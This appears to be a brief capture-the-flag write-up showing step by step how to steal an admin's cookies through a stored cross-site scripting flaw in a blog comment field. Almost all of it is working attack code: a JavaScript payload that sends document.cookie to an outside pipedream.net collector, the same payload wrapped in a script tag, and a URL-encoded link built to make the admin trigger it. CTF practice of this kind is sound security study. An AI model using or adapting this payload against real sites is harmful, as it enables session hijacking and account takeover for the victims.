0) Create an endpoint on requestBean
1) create a script that posts cookies to your requestBean
```js
const headers = new Headers();
headers.append("Content-Type", "application/json");

const body = {
  'cookies': document.cookie
};
 
const options = {
  method: "POST",
  headers,
  body: JSON.stringify(body)
};
fetch("https://eo1xxlwzc2rmdlj.m.pipedream.net", options);

```
3) Add semicolons to the end of every line. Envelop it with a `<script>` tag. 
```js
<script>
const headers = new Headers();
headers.append("Content-Type", "application/json");

const body = {
  'cookies': document.cookie
};
 
const options = {
  method: "POST",
  headers,
  body: JSON.stringify(body)
};
fetch("https://eo1xxlwzc2rmdlj.m.pipedream.net", options);
</script>
```
4) insert the script in the unsanitized input. 
5) Send the with an href to the new unsanitized comment to adm
```
http://travelers.ganeshicmc.com:2337/blog/diario-viajante-ep7/?nome=a&comentario=%3Cscript%3E+const+headers+%3D+new+Headers%28%29%3B+headers.append%28%22Content-Type%22%2C+%22application%2Fjson%22%29%3B++const+body+%3D+%7B+++%27cookies%27%3A+document.cookie+%7D%3B+++const+options+%3D+%7B+++method%3A+%22POST%22%2C+++headers%2C+++body%3A+JSON.stringify%28body%29+%7D%3B+fetch%28%22https%3A%2F%2Feo1xxlwzc2rmdlj.m.pipedream.net%22%2C+options%29%3B+%3C%2Fscript%3E
```
